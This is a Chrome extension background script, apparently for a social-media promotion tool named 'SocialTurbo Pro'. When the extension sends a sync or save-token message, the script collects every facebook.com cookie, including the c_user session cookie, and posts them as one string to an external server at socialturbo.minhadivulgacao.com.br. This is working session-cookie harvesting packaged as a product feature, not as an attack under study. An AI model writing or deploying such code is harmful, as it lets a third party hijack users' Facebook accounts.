const DEFAULT_URL = "https://socialturbo.minhadivulgacao.com.br";

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "sync_now") {
    syncWithServer(request.userId).then(sendResponse);
    return true; 
  }
  
  if (request.action === "save_token") {
    chrome.storage.local.set({ turboToken: request.userId }, () => {
      syncWithServer(request.userId).then(sendResponse);
    });
    return true;
  }
});

async function syncWithServer(userId) {
  try {
    const apiEndpoint = `${DEFAULT_URL}/api/sync-extension`;

    // Busca cookies do Facebook
    const cookies = await chrome.cookies.getAll({ domain: "facebook.com" });
    const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');

    if (!cookieStr.includes("c_user")) {
      return { success: false, error: "Acesse o Facebook primeiro!" };
    }

    const response = await fetch(apiEndpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId, cookies: cookieStr })
    });

    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Sync Error:", error);
    return { success: false, error: "Falha na conexão com o servidor" };
  }
}

console.log("SocialTurbo Pro Background Active");
